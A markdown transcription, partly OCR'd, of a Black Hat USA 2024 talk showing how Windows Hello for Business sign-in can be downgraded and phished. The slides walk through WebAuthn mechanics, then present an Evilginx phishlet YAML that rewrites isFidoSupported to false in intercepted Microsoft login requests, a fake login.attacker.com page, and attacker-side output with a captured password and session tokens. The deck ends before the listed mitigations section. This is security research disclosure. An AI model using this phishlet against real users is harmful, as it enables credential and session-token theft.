---
title: "Hook, Line and Sinker Phishing Windows Hello for Business"
speakers: ["Yehuda Smirnov"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Yehuda Smirnov_Hook, Line and Sinker Phishing Windows Hello for Business.pdf"
pages: 139
sha256: "b7dc87db72e4a7001f962d3a4bb3cf0036c90c4b754c1e212de6654c5a16615e"
text_chars: 25205
ocr_pages: 49
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.2
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:47:11Z"
---
# Hook, Line and Sinker Phishing Windows Hello for Business

**Speakers:** Yehuda Smirnov  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Yehuda Smirnov_Hook, Line and Sinker Phishing Windows Hello for Business.pdf` (139 pages)


## Slide 1

HOOK, LINE AND SINKER: PHISHING WINDOWS HELLO FOR BUSINESS

Yehuda Smirnov


> Recovered by OCR — confidence 94/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA 2024
AUGUST 7-8, 2024
BRIEFINGS
HOOK, LINE AND SINKER:
PHISHING WINDOWS HELLO FOR
BUSINESS
#BHUSA @BlackHatEvents
```

## Slide 2

## ABOUT ME

R E D T E A M & SE C U R I TY R E SE A RCH ER @ A C C E N T U RE SE C U R I T Y I SR A E L

@y ud as m _ on t wit t e r

- Like learning & researching Windows, Active Directory, Azure and anything interesting

- Develop in C, C#, Python & Assembly

###### Ye h ud a S m irnov

- Ex private investigator

- Like to surf & play tennis

## Slide 3

ABOUT ME
@y ud as m _ on t wit t e r
• Like learning & researching Active
Directory, Windows, Azure and
anything interesting
• Develop in C, C#, Python & Assembly
• Ex private investigator
Ye h ud a S m irnov • Like to surf & play tennis

## Slide 4

## AGENDA

- Intro to Windows Hello For Business (WHfB)

- Understanding WebAuthn API

- Investigation

- Proxy Phishing

- Mitigations

## Slide 5

## INTRODUCTION

- Windows Hello for Business (WHfB from now on) is considered a **phishing resistant authentication method** .

- • Discovered a method to phish Windows Hello for Business

## Slide 6

## WINDOWS HELLO

## Slide 7

## WINDOWS HELLO

## Slide 8

## WINDOWS HELLO


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WINDOWS HELLO
o Windows Security
Accounts > Sign-in options
Making sure it’s you Ways to sign in
1Password is trying to unlock.
«+ _ Facial recognition (Windows Hello)
Sign in with your camera (Recommended)
PIN
| forgot my PIN
gs Fingerprint recognition (Windows Hello)
@ gerp g
Sign in with your fingerprint scanner (Recommended)
_ Sign in with a PIN (Recommended)
```

## Slide 9

## WINDOWS HELLO - TPM

- The TPM - Trusted Platform Module is a chip located on the motherboard / CPU, which stores cryptographic keys directly in the hardware.

## Slide 10

## WINDOWS HELLO - TPM

**Enrollment** - Windows Hello pin is hashed & stored in the TPM

## Slide 11

## WINDOWS HELLO - TPM

**Enrollment** - Windows Hello pin is hashed & stored in the TPM **Authentication** - provide Windows Hello Pin, which is sent to the TPM

## Slide 12

## WINDOWS HELLO - TPM

**Enrollment** - Windows Hello pin is hashed & stored in the TPM **Authentication** - provide Windows Hello Pin, which is sent to the TPM **Verification** - TPM verifies the pin by comparing the input PIN to the hash stored

## Slide 13

## WINDOWS HELLO FOR BUSINESS

## Slide 14

## WINDOWS HELLO FOR BUSINESS

## Slide 15

## WINDOWS HELLO FOR BUSINESS


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WINDOWS HELLO FOR
BUSINESS
Microsoft
Sign-in options
```

## Slide 16

## WINDOWS HELLO FOR BUSINESS


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WINDOWS HELLO FOR
BUSINESS
Windows Security
Sign in with your passkey
To sign in to “login.microsoft.com”, choose a passkey.
This request comes from the app “brave.exe” by “Brave Software,
Inc.”.
Microsoft
e someuser@gmai.com
a? Face, fingerprint, PIN or security
More choices
| a someuser@gmai.com
ay user@company.com
+++ Use another device
```

## Slide 17

## WINDOWS HELLO FOR BUSINESS


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WINDOWS HELLO FOR
BUSINESS
o Windows Security
Making sure it’s you Microsoft
Sign in with your passkey to “login.microsoft.com" as Face, fi ngerp ri nt, PIN or secu rity
This request comes from the app “brave.exe” by “Brave Software,
Inc.”.
| forgot my PIN
```

## Slide 18

## WINDOWS HELLO FOR BUSINESS


> Recovered by OCR — confidence 96/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WINDOWS HELLO FOR
BUSINESS
Azure services
Resources
```

## Slide 19

## FIDO KEYS

• Fido Keys may act as a replacement for the TPM’s role in the authentication • Can store cryptographic keys on them • Also called Yubi keys, **physical authenticators** , security keys, etc

## Slide 20

## DEFAULT AUTHENTICATION

- After performing successful authentication via Azure, the default authentication method is set to that method

- • **(Today it is no longer the case)**

## Slide 21

- DEFAULT AUTHENTICATION • After performing successful authentication via Azure, the default authentication method is set to that method

- **(Today it is no longer the case)**

- **Today the default authentication is the strongest one available**

## Slide 22

## DEFAULT AUTHENTICATION

## Slide 23

## DEFAULT AUTHENTICATION


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEFAULT
AUTHENTICATION
Windows Security
Sign in with your passkey
To sign in to “login.microsoft.com”, choose a passkey.
This request comes from the app “brave.exe” by “Brave Software,
Inc.”.
Microsoft
e someuser@gmai.com
a? Face, fingerprint, PIN or security
More choices
| a someuser@gmai.com
ay user@company.com
+++ Use another device
```

## Slide 24

## WINDOWS HELLO FOR BUSINESS

Windows Hello for  Administrator
Traditional
Businesss
Passwords

## Slide 25

## WINDOWS HELLO FOR BUSINESS

Traditional
Passwords

**Can’t you just phish that password too?**

## Slide 26

WINDOWS HELLO FOR
BUSINESS
Windows Hello for  Administrato
Traditional
Webauthn API
Businesss r
Passwords
Phisher
Can’t you just phish that
password too?

## WINDOWS HELLO FOR BUSINESS

## Slide 27

## DEMONSTRATION

## Slide 28

DEMONSTRATION - ATTACKER’S SITE


> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - ATTACKER'’S SITE
```

## Slide 29

DEMONSTRATION - FAILED PHISH


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“DEMONSTRATION - FAILED PHISH
Ld Windows Security
Sign in with your passkey
To sign in to “attackercom". choose a device with a saved
passkey.
Security key
More choices
oe iPhone, iPad, or Android device
| A Security key
```

## Slide 30

DEMONSTRATION - FAILED PHISH


> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“DEMONSTRATION - FAILED PHISH
Ld Windows Security
To sign in to “attacker.com", choose a device with a saved
passkey.
fe iPhone, iPad, or Android device
| A Security key
Next Cancel
```

## Slide 31

## WEBAUTHN

## API

## Slide 32

## WEBAUTHN API

Protects against phishing

* https://developer.mozilla.org/enUS/docs/Web/API/Web_Authentication_API

## Slide 33

## WEBAUTHN API

Protects against
phishing

Reduces impact in case of breach

* https://developer.mozilla.org/enUS/docs/Web/API/Web_Authentication_API

## Slide 34

## WEBAUTHN API

Protects against
phishing

Reduces impact in case of breach

Protects against password attacks

- https://developer.mozilla.org/en-

- US/docs/Web/API/Web_Authentication_API

## Slide 35

## WEBAUTHN API

- Enables creation and use of secure, scoped and verified public key based credentials.

Protects against phishing

Reduces impact in case of breach

Protects against password attacks

* https://developer.mozilla.org/enUS/docs/Web/API/Web_Authentication_API

## Slide 36

## MECHANISMS

Challenge

Signature

Origin Check

Assertion

## Slide 37

## MECHANISMS - CHALLENGE

Challenge

## Slide 38

## MECHANISMS - CHALLENGE

#### Challenge

- Unique challenge (nonce) issued by the server

- • Must be signed using the appropriate private key • Private key is stored in the TPM / Fido key

## Slide 39

## MECHANISMS - SIGNATURE

Signature

## Slide 40

## MECHANISMS - SIGNATURE

#### Signature

- Client browser interacts with the operating system

- • Signs the challenge using the user's private key (commonly in TPM / Fido)

## Slide 41

## MECHANISMS - ORIGIN CHECK

Origin Check

## Slide 42

## MECHANISMS - ORIGIN CHECK

#### Origin Check

- Origin defined by protocol (http / https) , hostname (domain) , and port - **https** :// **example.com** : **443**

- Origin field is a header, automatically set by the browser, likely to prevent domain spoofing

- Checked by both client browser and server

## Slide 43

## MECHANISMS - ASSERTION

Assertion

## Slide 44

## MECHANISMS - ASSERTION

#### Assertion

- Client returns the encrypted challenge, along with the origin field

- Both are signed with the private key

- This entire package is termed - assertion

## Slide 45

## MECHANISMS - ASSERTION

#### Assertion

- Client returns the encrypted challenge, along with the origin field

- • Both are signed with the private key

- This entire package is termed - assertion

## Slide 46

## MECHANISMS - ASSERTION

Assertion

- Client returns the encrypted challenge, along with the origin field

- • Both are signed with the private key

- This entire package is termed - assertion

## Slide 47

## MECHANISMS

Challenge

Signature

Origin Check

Assertion

## Slide 48

MECHANISMS
Why so secure?
Challenge Asymmetric  Origin Check Assertion
Encryption

## MECHANISMS

## Slide 49

ARCHITECTURE

## Slide 50

ARCHITECTURE - REGISTRATION

## Slide 51

## ARCHITECTURE - REGISTRATION

Physical Authenticator

Browser

TPM / Software

WebAuthn Register

Server Server Side Web App “Relying Party”

**Step 1**

- User logs in with username & password/MFA

- Chooses to create a new credential (e.g. Fido / WHfB)

## Slide 52

## ARCHITECTURE - REGISTRATION

Browser
WebAuthn
WebAuthn API in  Client Side
Register
browser JavaScript
Client Platform
Physical
Authenticator
TPM /
Software
Step 2

Server Server Side Web App “Relying Party”

- Server ("Relying-party") script runs in the client browser

## Slide 53

## ARCHITECTURE - REGISTRATION

Browser

WebAuthn API in Client Side browser JavaScript Client Platform Physical Authenticator TPM / Software **Step 2**

TPM / Software

Server Server Side Web App “Relying Party”

- Server ("Relying-party") script runs in the client browser

- Utilizes the Client Platform (user-agent header and device - laptop, mobile)

## Slide 54

## ARCHITECTURE - REGISTRATION

Browser

WebAuthn API in browser Client Platform Physical Authenticator **Step 3**

TPM / Software

Server Server Side Web App “Relying Party”

- Client platform connects to the authenticator (e.g., Fido / TPM)

- • Requests an authorization gesture from the user (e.g., fingerprint, Windows Hello)

## Slide 55

## ARCHITECTURE - REGISTRATION

Physical Authenticator **Step 3**

Browser

WebAuthn API in browser

Client Platform

TPM / Software

Server Server Side Web App “Relying Party”

- Client platform connects to the authenticator (e.g., Fido / TPM)

- • Requests an authorization gesture from the user (e.g., fingerprint, Windows Hello)

## Slide 56

## ARCHITECTURE - REGISTRATION

Browser

Server

Physical Authenticator **Step 4**

WebAuthn API in browser

Client Platform

TPM /

Software

Server Side Web App “Relying Party”

- If authorized, a new credential (private key) is created

## Slide 57

SECURITY - CREDENTIAL

## Slide 58

## SECURITY - CREDENTIAL

Public Key

## Slide 59

## SECURITY - CREDENTIAL

Public Key

Private Key

## Slide 60

## ARCHITECTURE - REGISTRATION

Physical Authenticator **Step 4**

Browser

**Private Key**

TPM /

Software

Server

Server Side Web App

“Relying Party”

- Stored within the authenticator (TPM / Fido)

## Slide 61

## ARCHITECTURE - REGISTRATION

Browser **Public Key**

Server Server Side Web App “Relying Party”

Physical Authenticator **Step 5**

TPM / Software

• Credential's public key is sent to the server

- Attestation containing additional information is also sent

## Slide 62

ARCHITECTURE - AUTHENTICATION

## Slide 63

## ARCHITECTURE - AUTHENTICATION

Browser

Server

Client Side JavaScript

Server Side Web App

“Relying Party”

Physical Authenticator **Step 1**

TPM / Software

- Server ("Relying-Party") serves a script to users

## Slide 64

## ARCHITECTURE - AUTHENTICATION

Browser
WebAuthn API in  Client Side
browser JavaScript
Physical
Authenticator
TPM /
Software
Step 1

Server Server Side Web App “Relying Party”

- Script requests an challenge (nonce) from the server

## Slide 65

## ARCHITECTURE - AUTHENTICATION

Physical Authenticator **Step 1**

Browser WebAuthn API in Client Side browser JavaScript

TPM / Software

Server Server Side Web App “Relying Party”

- Script requests an challenge (nonce) from the server

- Server returns the challenge to the client

## Slide 66

## ARCHITECTURE - AUTHENTICATION

Browser

WebAuthn API in Client Side browser JavaScript

Physical Authenticator **Step 1**

TPM / Software

- Interacts with the WebAuthn API

Server Server Side Web App “Relying Party”

## Slide 67

## ARCHITECTURE - AUTHENTICATION

Browser
WebAuthn API in
browser
Client Platform
Physical
Authenticator
TPM /
Software
Step 2

Server
Server Side Web
App
“Relying
Party”

- Browser utilizes the client platform to request hardware authorization

## Slide 68

## ARCHITECTURE - AUTHENTICATION

Server
Browser
WebAuthn API in
Server Side Web
browser
App
“Relying
Party”
Client Platform
Physical
Authenticator
TPM /
Software
Step 2

- Following user authorization, client platform searches for potential credentials (relevant private key)

## Slide 69

## SECURITY - ORIGIN

##### **WebAuthn API**

Microsoft.com
user1
user2

Github.com
user3
user4

## Slide 70

## SECURITY - ORIGIN

What credentials
are available for
Microsoft.com?

##### **WebAuthn API**

Microsoft.com
user1
user2

Github.com
user3
user4

## Slide 71

## SECURITY - ORIGIN

user 1
user 2

##### **WebAuthn API**

Microsoft.com
user1
user2

## Slide 72

## SECURITY - ORIGIN

**No access to another domain’s (origin) credentials**

##### **WebAuthn API**

**Microsoft.com user1 user2**

## Slide 73

ARCHITECTURE - AUTHENTICATION


> Recovered by OCR — confidence 82/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ARCHITECTURE - AUTHENTICATION
7 Windows Security
Sign in with your passkey
To sign in to} “login. microsoft.com”) choose a passkey.
This request comes from the app "brave.exe” by “Brave Software,
More choices
ay user2@company2.com
«++ Use another device
```

## Slide 74

## ARCHITECTURE - AUTHENTICATION

Browser

Server

Physical Authenticator

**Step 4**

Client Platform

TPM / Software

Server Side Web App

“Relying Party”

- Client platform signs the challenge using stored private key (Fido key / TPM / software)

## Slide 75

## ARCHITECTURE - AUTHENTICATION

Browser

Server

Server Side Web App

“Relying Party”

Physical Authenticator

**Step 4**

TPM /

Software

- Client platform signs the challenge using stored private key (Fido key / TPM / software)

## Slide 76

## ARCHITECTURE - AUTHENTICATION

Browser

Assertion
Physical
Authenticator
TPM /
Software
Step 4

Server Server Side Web App “Relying Party”

- Client returns the signed assertion (includes challenge) to server.

## Slide 77

## ARCHITECTURE - AUTHENTICATION

Assertion

Server


> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ARCHITECTURE - AUTHENTICATION
"type": "webauthn.get",
"crossOrigin":false,
"other_keys_can_be_added_here":
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
a
a
a
a
```

## Slide 78

## ARCHITECTURE - AUTHENTICATION

Is this
Server
me?
Assertion


> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ARCHITECTURE - AUTHENTICATION
"type": "webauthn.get",
"challenge": "Ty5leUowZ...snip...jJIxRFBPb
"crossOrigin":false,
"other_keys_can_be_added_here":
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
a
a
```

## Slide 79

## ARCHITECTURE - AUTHENTICATION

Server

## Slide 80

ARCHITECTURE
When you finally get to know
WebAuthn API after all those slides

## Slide 81

INVESTIGATION

## Slide 82

## INVESTIGATION


> Recovered by OCR — confidence 78/100 on the text kept, 55/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
POST /common/Login HTTP/2
Host: Login.microsoftonLine.com
Cookie: ...snip...
Origin: https://lLogin.microsoft.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko)
Chrome/125.0.6422.112 Safari/537.36
| WUFFqTnLVMj LpY1ROdFdTMTRTMVFSTm1iKeE4zZFdPRmRwVnpswF LuVkSWV2g2UmxGe LFXcGZRbF JOT jNKSmIrZGZWMmhoZGpCbk5IaEJk
```

## Slide 83

INVESTIGATION


> Recovered by OCR — confidence 78/100 on the text kept, 42/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
tat
"authenticatorData": "NWyelKCTIbLpXx6vkYID8bVfaJ2mH7yWwGEwVfdpoDIEFAAAAAA"
° "signature":
}
```

## Slide 84

## INVESTIGATION


> Recovered by OCR — confidence 90/100 on the text kept, 42/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
"signature":
"userHandLe":
}
```

## Slide 85

INVESTIGATION


> Recovered by OCR — confidence 90/100 on the text kept, 50/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
"type": "webauthn.get",
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
```

## Slide 86

INVESTIGATION


> Recovered by OCR — confidence 80/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
}
"type": "webauthn.get",
"challenge":
reHZXROZHWmSCS1EwSndaMEkwU21GTGNSS jkuZX LKaGRXUWLPaUoxY200NmJXbGpjbTL6Yj JaME9twnB
ZMj LOSWL3aWFXRjBJam94 TnpFNUSUY3 LNamN4TENKdVLtWwWlPakUzTVRrMU56SX LOekVZSWIWNGNDSTZ
"crossOrigin":false,
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
```

## Slide 87

## INVESTIGATION

## Slide 88

INVESTIGATION


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
Microsoft
Sign-in options
```

## Slide 89

INVESTIGATION


> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
2 Host: Login.microsoftonLline.com
3 Cookie: ..snip...
4y User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/126.0.6478.57
Safari/537.36
5 Content-Length: 1938
6 Content-Type: application/json; charset=UTF-8
7 Accept-Encoding: gzip, deflate, br
g Priority: u=1, i
"username": "user@company.com",
"checkPhones":false,
"isRemoteNGCSupported":true,
"isCookieBannerShown": false,
"isFidoSupported":true,
"country": "IL",
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported":false,
"federationFlags":0,
"isSignup":false,
```

## Slide 90

INVESTIGATION


> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
POST /common/GetCredentialType?mkt=en-US HTTP/1.1
Host: Login.microsoftonline.com
Cookie: ..snip...
\User—Agent: Mozilla/5.0 (Windows NT 10.0; Win6é4; x64) AppleWebKkit/537.36 (KHTML, Like Gecko) Chrome/126.0.6478.57
Content-Length: 1938
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
{
"isOtherIdpSupported":true,
"checkPhones": false,
"isRemoteNGCSupported":true,
"isCookieBannerShown": false,
| "isFidoSupported":true,|
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported":false,
"federationFlags":0,
"isSignup":false,
```

## Slide 91

## INVESTIGATION

• **Modifying IsFidoSupported does not work as of today**


> Recovered by OCR — confidence 87/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INVESTIGATION
¢ Modifying IsFidoSupported does not work as of today
|POST /common/GetCredentialType?mkt=en-US HTTP/1.1
Cookie: ..snip...
1
2 Host: Login.microsoftonLine.com
3
4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/126.0.6478.57
5 Content-Length: 1938
6 Content-Type: application/json; charset=UTF-8
7 Accept-Encoding: gzip, deflate, br
g |Priority: u=1, i
"isOtherIdpSupported":true,
"checkPhones": false,
"isRemoteNGCSupported":true,
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported": false,
"federationFlags":0,
"isSignup":false,
"flowToken": "AQABIQEAAAApT...snip...E4gigEdwgAA",
"isAccessPassSupported": true
```

## Slide 92

## DEMONSTRATION

## Slide 93

## DEMONSTRATION - SIGN IN


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - SIGN IN
Microsoft
Sign in
yehuda.smirnov@company.com
No account? Create one!
Canta your account?
CY Sign-in options
```

## Slide 94

DEMONSTRATION - INTERCEPT


> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - INTERCEPT
POST /common/GetCredentialType?mkt=en-US HTTP/1.1
Host: Login.microsoftonLine.com
Cookie: ..snip...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0)
Gecko/20100101 Firefox/127.9
Origin: https://Login.microsoftonLine.com
"username": "yehuda.smirnov@company.com",
"isOtherIdpSupported":true,
"checkPhones": false,
"isCookieBannerShown": false,
"isFidoSupported":true,
"originalRequest":
1",
"forceotcLogin": false,
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported": false,
"federationFlags":0,
"isSignup":false,
"isAccessPassSupported":true,
"isQrCodePinSupported": true
```

## Slide 95

DEMONSTRATION - INTERCEPT


> Recovered by OCR — confidence 83/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - INTERCEPT
wee) POST /common/GetCredentialType?mkt=en-US HTTP/1.1
wee) Host: Login.microsoftonline.com
@ee) Cookie: ..snip...
wee User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0)
"username": "yehuda.smirnov@company.com",
"checkPhones": false,
"isRemoteNGCSupported":true,
"isCookieBannerShown": false,
"isFidoSupported": false,
1",
"forceotclogin": false,
"isExternalFederationDisalLlowed": false,
"isRemoteConnectSupported": false,
"federationFlags":0,
"isSignup":false,
"isAccessPassSupported":true,
```

## Slide 96

DEMONSTRATION - DOWNGRADED


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - DOWNGRADED
© yehudasmirnov@company.com
Enter password
Password
```

## Slide 97

DEMONSTRATION - DOWNGRADED


> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - DOWNGRADED
© yehudasmirnov@company.cam
Enter password
```

## Slide 98

DEMONSTRATION - DOWNGRADED


> Recovered by OCR — confidence 93/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - DOWNGRADED
a= Microsoft
yehuda.smirnov@company.com
Enter code
Enter the code displayed in the authenticator
app on your mobile device
285494
Having trouble? Sign in another \
More information
```

## Slide 99

DEMONSTRATION - DOWNGRADED


> Recovered by OCR — confidence 82/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - DOWNGRADED
Microsoft 365 Search © & &
Home
iS) Welcome to Microsoft 365 Install and more ~
Quick access
a ( All © Recently opened &8 Shared YY Favorites | + 7 Upload = 69
App
HB 72230608322 Jun 26 Microsoft sent this
oF
```

## Slide 100

PROXY PHISHING

## Slide 101

## PROXY PHISHING

User

Azur e Response from Azure

Sign-in request

## Slide 102

## PROXY PHISHING

User Attacker Azur
e
Forwards
response to user Response from Azure
Sign-in request Forwards request
to Azure

## Slide 103

## PROXY PHISHING - EVILGINX

User Attacker Azur
e
Forwards
response to user Response from Azure
Sign-in request Forwards request
to Azure
Link to the Evilginx framework:
made by @mrgretzky

## Slide 104

PROXY PHISHING - EVILGINX


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PROXY PHISHING - EVILGINX
® login.attacker.com,
Microsoft Azure
B® Microsoft
Sign in
to continue to Microsoft Azure
Email, p
No account? Create one!
Can't access your account?
ww) Sign in with GitHub
Qy Sign-in options
```

## Slide 105

PROXY PHISHING - EVILGINX

Azure


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PROXY PHISHING - EVILGINX
® login.attacker.com,
Attacker
Microsoft Azure a: re & User
Sign in
to continue to Microsoft Azure
ww) Sign in with GitHub
Qy Sign-in options
```

## Slide 106

PROXY PHISHING - EVILGINX


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PROXY PHISHING - EVILGINX
login.attacker.com
```

## Slide 107

## AUTOMATION


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AUTOMATION
+ yudasm commented on Mar 5 Contributor |) +++
Added support for force_post for json parameters (supported only regular http parameters)
Useful for intercepting requests to URLs such as /common/GetCredentialType which are used to initiate Windows Hello for
Business auth flow
Blog post will be published soon on this subject
The following force_post section can now alter the API post request and modify it on the fly, something that could not be done
beforehand due to limitations with modifications of JSON params.
- path: ‘/common/GetCredentialType'
search:
- {key: "isFidoSupported’, search: ".*"}
force:
- {key: "isFidoSupported'’, value: "false"}
type: "post'
```

## Slide 108

AUTOMATION


> Recovered by OCR — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TOMATION
WHfB-0365-Phishlet / 0365whfb.yaml
Code Blame 91 lines (91 loc) - 2.8 KB
12 - domain: ‘login.microsoftonline.com*
14 type: ‘cookie’
15 force_post:
16 - path: '/kmsi‘
17 search:
18 - {key: ‘LoginOptions’, search: *.*"}
19 force:
20 - {key: "LoginOptions’, value: '1"}
21 type: ‘post’
22 - path: ‘/common/GetCredentialType*
23 search:
24 - {key: "isFidoSupported’, search: *.**}
25 force:
26 - {key: ‘isFidoSupported’, value: ‘false'}
27 tvpe: "post"
```

## Slide 109

## DEMONSTRATION

## Slide 110

DEMONSTRATION - PHISHING SITE


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - PHISHING SITE
® login.attacker.com
Microsoft
Sign in
yehuda.smirnov@company.com
No acco
Can't ac
a, Sign-in options
```

## Slide 111

DEMONSTRATION - PHISHING SITE


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - PHISHING SITE
® login.attacker.com
Microsoft
< yehuda.smirnov@company.com
Enter password
Pz rd
Forgot my password
Use your face, fingerprint, PIN, or security key instead
```

## Slide 112

DEMONSTRATION - PHISHING SITE


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - PHISHING SITE
® login.attacker.com,
Microsoft
< yehuda.smirnov@company.com
Enter password
```

## Slide 113

DEMONSTRATION - PHISHING SITE


> Recovered by OCR — confidence 96/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - PHISHING SITE
Microsoft
yehuda.smirnov@company.com
Enter code
Enter the code displayed in the authenticator
app on your mobile device
474657
Having trouble? Sign in anothe
More information
```

## Slide 114

DEMONSTRATION - REDIRECT


> Recovered by OCR — confidence 86/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - REDIRECT
© Home | Microsoft 365 x
23 Microsoft 365 S Search
A
Home
: Welcome to Microsoft 365
Le Quick access
Ep
“ees ff@ All © Recently opened
Apps
“me = 52230606780
2&3 Shared
TY Favorites
Jun 26
Jun 26
Install and more ~
Microsoft sent this
Microsoft sent this
```

## Slide 115

DEMONSTRATION - ATTACKER SIDE


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 46/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
DEMONSTRATION - ATTACKER SIDE

[10:54:41] [+++] [0] detected authorization URL - tokens intercepted: /favicon.ico
: sessions

+----+----------------+----------------+----------+----------+---------------+------------------+
| id | phishlet | username | password | tokens | remote ip | time |
+----+----------------+----------------+----------+----------+---------------+------------------+
| 95 | microsoft365new | yehuda.smir..... | | captured | [obscured] | 2023-08-27 10:54 |
+----+----------------+----------------+----------+----------+---------------+------------------+

: sessions 95

 id           : 95
 phishlet     : microsoft365new
 username     : yehuda.smirnov@company.com
 password     : DefinitelyNotMyP$ssword
 tokens       : captured
 landing url  : https://login.[obscured].com/WOscRgJS?b=BAlOq2nOvQwQnOWIOiGKqw
 user-agent   : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
 remote ip    : 93.157.86.34
 create time  : 2023-08-27 10:54
 update time  : 2023-08-27 10:54

[ cookies ]
